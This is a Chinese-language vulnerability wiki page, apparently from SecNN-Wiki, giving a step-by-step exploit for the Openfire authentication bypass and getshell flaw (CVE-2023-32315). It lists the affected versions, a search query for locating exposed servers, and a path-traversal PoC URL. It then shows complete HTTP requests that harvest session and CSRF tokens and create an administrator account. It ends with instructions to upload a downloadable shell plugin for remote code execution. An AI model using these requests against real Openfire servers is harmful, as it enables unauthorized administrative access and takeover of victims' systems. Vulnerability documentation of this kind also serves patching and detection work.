<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Openfire/Openfire%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%26getshell%28CVE-2023-32315%29/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Openfire身份认证绕过漏洞&amp;getshell(CVE-2023-32315) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Openfire\u8eab\u4efd\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\u0026amp;getshell(CVE-2023-32315)", url: "#_top", children: [
          ]},
          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
          ]},
          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
          ]},
          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
          ]},
          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
              {title: "POC", url: "#poc" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Openfire%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%28CVE-2023-32315%29/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Openfire%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%28CVE-2023-32315%29/" class="btn btn-xs btn-link">
        Openfire身份认证绕过漏洞(CVE 2023 32315)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../OpenWrt/OpenWrt%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../OpenWrt/OpenWrt%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
        OpenWrt任意文件读取
      </a>
    </div>
    
  </div>

    

    <h1 id="openfiregetshellcve-2023-32315">Openfire身份认证绕过漏洞&amp;getshell(CVE-2023-32315)<a class="headerlink" href="#openfiregetshellcve-2023-32315" title="Permanent link">&para;</a></h1>
<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
<div class="codehilite"><pre><span></span><code>  Openfire是免费的、开源的、基于可拓展通讯和表示协议(XMPP)、采用Java编程语言开发的实时协作服务器。Openfire安装和使用都非常简单，并利用Web进行管理。单台服务器甚至可支持上万并发用户。Openfire的管理控制台是一个基于 Web 的应用程序，被发现可以使用路径遍历的方式绕过权限校验。成功利用后，未经身份验证的用户可以访问 Openfire 管理控制台中的后台页面。同时由于Openfire管理控制台的后台提供了安装插件的功能，所以攻击者可以通过安装恶意插件达成远程代码执行的效果。
</code></pre></div>

<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
<ul>
<li>3.10.0 &lt;= Openfire &lt; 4.6.8</li>
<li>4.7.0 &lt;= Openfire 4.7.x &lt; 4.7.5</li>
</ul>
<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
<ul>
<li>hunter<code>app.name="Openfire"</code><img alt="1692201143517-80f3a4d3-bec2-4829-876a-090c26f9d7e0.png" src="./img/TunDJjI7qkurQ1y9/1692201143517-80f3a4d3-bec2-4829-876a-090c26f9d7e0-665458.png" /></li>
<li>登录页面</li>
</ul>
<p><img alt="1692201198433-2be7c1b6-5b9c-4f5f-9797-91444ec564ad.png" src="./img/TunDJjI7qkurQ1y9/1692201198433-2be7c1b6-5b9c-4f5f-9797-91444ec564ad-037854.png" /></p>
<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
<h2 id="poc">POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<p>当访问poc出现如下情况表示存在漏洞</p>
<div class="highlight"><pre><span></span><code>/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
</code></pre></div>
<p><img alt="1692201286860-3786d6ee-869c-4059-b250-141dd492092e.png" src="./img/TunDJjI7qkurQ1y9/1692201286860-3786d6ee-869c-4059-b250-141dd492092e-360287.png" /></p>
<p>EXP</p>
<ol>
<li>获取<code>JSESSIONID</code>和<code>csrftoken</code></li>
</ol>
<div class="highlight"><pre><span></span><code>GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
</code></pre></div>
<p><img alt="1692201403607-088e873f-8b9d-4e95-bbdc-22591b30bb7c.png" src="./img/TunDJjI7qkurQ1y9/1692201403607-088e873f-8b9d-4e95-bbdc-22591b30bb7c-863460.png" /></p>
<ol>
<li>通过上一步回去到的<code>JSESSIONID</code>和<code>csrftoken</code>替换下列数据包中相应参数，构造用户</li>
</ol>
<div class="highlight"><pre><span></span><code>GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=qvq9l8fyflxMuwP&amp;username=test123&amp;name=&amp;email=&amp;password=test123&amp;passwordConfirm=test123&amp;isadmin=on&amp;create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=node0m00xukgw3om052y56u7ppl451582.node0; csrf=qvq9l8fyflxMuwP
Upgrade-Insecure-Requests: 1
</code></pre></div>
<p><img alt="1692201513050-a62bdc73-e575-464c-80f8-76e6d088d6be.png" src="./img/TunDJjI7qkurQ1y9/1692201513050-a62bdc73-e575-464c-80f8-76e6d088d6be-661254.png" /></p>
<ol>
<li>使用创建的账户<code>test123/test123</code>,登录</li>
</ol>
<p><img alt="1692201674481-2f2c2a1d-6249-439e-a4c0-7092b17aa047.png" src="./img/TunDJjI7qkurQ1y9/1692201674481-2f2c2a1d-6249-439e-a4c0-7092b17aa047-414561.png" /></p>
<ol>
<li>在插件处上传利用插件getsgell</li>
</ol>
<p>插件下载地址：<a href="https://download.csdn.net/download/qq_33331244/88224220">https://download.csdn.net/download/qq_33331244/88224220</a></p>
<p><img alt="1692202063603-a440bf6b-8bbb-4e44-b742-732bd84bb9e7.png" src="./img/TunDJjI7qkurQ1y9/1692202063603-a440bf6b-8bbb-4e44-b742-732bd84bb9e7-926645.png" /></p>
<ol>
<li>插件上传成功</li>
</ol>
<p><img alt="1692202109870-8ee54e40-3ef4-459f-81d5-3f5570cbedba.png" src="./img/TunDJjI7qkurQ1y9/1692202109870-8ee54e40-3ef4-459f-81d5-3f5570cbedba-838296.png" /></p>
<ol>
<li>进入服务器-&gt;服务器设置-&gt;shellplugin，输入密码123，即可实现rce</li>
</ol>
<p><img alt="1692202180669-e5ebf2c2-650b-4000-b631-60a70bc1ef45.png" src="./img/TunDJjI7qkurQ1y9/1692202180669-e5ebf2c2-650b-4000-b631-60a70bc1ef45-199143.png" /></p>
<p><img alt="1692202195272-898e77a1-37c4-43cd-97f1-5c3be719f144.png" src="./img/TunDJjI7qkurQ1y9/1692202195272-898e77a1-37c4-43cd-97f1-5c3be719f144-956700.png" /></p>
<blockquote>
<p>更新: 2024-02-29 23:57:33<br />
原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/xq7trzegk6ecseyg">https://www.yuque.com/xiaokp7/ocvun2/xq7trzegk6ecseyg</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Openfire%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%28CVE-2023-32315%29/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Openfire%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%28CVE-2023-32315%29/" class="btn btn-xs btn-link">
        Openfire身份认证绕过漏洞(CVE 2023 32315)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../OpenWrt/OpenWrt%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../OpenWrt/OpenWrt%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
        OpenWrt任意文件读取
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>